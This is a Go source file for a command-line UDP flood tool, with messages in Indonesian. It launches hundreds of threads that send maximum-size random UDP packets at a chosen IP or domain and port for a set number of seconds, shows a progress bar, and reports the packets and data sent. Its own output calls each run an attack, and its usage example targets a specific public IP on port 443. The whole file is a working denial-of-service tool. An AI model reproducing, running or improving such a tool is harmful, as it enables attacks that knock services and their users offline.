package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

var (
	stopFlag    int32
	mu          sync.Mutex
	packetCount uint64
	byteCount   uint64
)

func resolveTarget(target string) string {
	if ip := net.ParseIP(target); ip != nil {
		return target
	}
	ips, err := net.LookupIP(target)
	if err != nil || len(ips) == 0 {
		fmt.Printf("[!] Gagal resolve %s\n", target)
		os.Exit(1)
	}
	for _, ip := range ips {
		if ip.To4() != nil {
			return ip.String()
		}
	}
	return ips[0].String()
}

func getStop() bool {
	mu.Lock()
	s := stopFlag
	mu.Unlock()
	return s == 1
}

func udpFlood(target string, port, payloadSize int, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := &net.UDPAddr{IP: net.ParseIP(target), Port: port}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, payloadSize)
	for !getStop() {
		rand.Read(payload)
		n, err := conn.Write(payload)
		if err != nil {
			continue
		}
		atomic.AddUint64(&packetCount, 1)
		atomic.AddUint64(&byteCount, uint64(n))
	}
}

func humanBytes(b uint64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := uint64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.2f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}

func progressBar(elapsed, total int) string {
	width := 40
	percent := float64(elapsed) / float64(total)
	if percent > 1 {
		percent = 1
	}
	filled := int(percent * float64(width))
	bar := ""
	for i := 0; i < width; i++ {
		if i < filled {
			bar += "█"
		} else {
			bar += "░"
		}
	}
	return fmt.Sprintf("[%s] %3.0f%%", bar, percent*100)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: ./udp <IP/domain> <port> <time> [-n threads] [-s payload]")
		fmt.Println("Contoh: ./udp 35.215.79.226 443 600 -n 1000")
		fmt.Println("Time bebas dalam detik, contoh 10, 60, 300, 3600.")
		os.Exit(1)
	}

	target := resolveTarget(os.Args[1])
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port <= 0 || port > 65535 {
		fmt.Println("[!] Port tidak valid.")
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("[!] Time tidak valid. Masukkan angka detik bebas.")
		os.Exit(1)
	}

	threads := 500
	size := 65507

	for i := 4; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "-n":
			if i+1 < len(os.Args) {
				threads, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		case "-s":
			if i+1 < len(os.Args) {
				size, _ = strconv.Atoi(os.Args[i+1])
				i++
			}
		}
	}

	if size > 65507 {
		size = 65507
	}
	if size < 1 {
		size = 1
	}
	if threads < 1 {
		threads = 1
	}

	fmt.Printf("[+] Target   : %s:%d\n", target, port)
	fmt.Printf("[+] Time     : %d detik\n", duration)
	fmt.Printf("[+] Thread   : %d\n", threads)
	fmt.Printf("[+] Payload  : %d byte\n", size)
	fmt.Println()

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go udpFlood(target, port, size, &wg)
	}

	fmt.Println("[+] Serangan UDP dimulai...")

	start := time.Now()
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			elapsed := int(time.Since(start).Seconds())
			if elapsed >= duration {
				elapsed = duration
			}
			pc := atomic.LoadUint64(&packetCount)
			bc := atomic.LoadUint64(&byteCount)
			fmt.Printf("\033[2K\r%s %ds/%ds | Paket: %d | Data: %s",
				progressBar(elapsed, duration), elapsed, duration, pc, humanBytes(bc))
			if elapsed >= duration {
				fmt.Println()
				fmt.Println("[+] 100% tercapai, durasi penuh. Menghentikan serangan...")
				mu.Lock()
				stopFlag = 1
				mu.Unlock()
				wg.Wait()
				fmt.Println("[+] Serangan selesai.")
				fmt.Printf("[+] Total paket terkirim : %d\n", atomic.LoadUint64(&packetCount))
				fmt.Printf("[+] Total data terkirim  : %s\n", humanBytes(atomic.LoadUint64(&byteCount)))
				return
			}
		}
	}
}
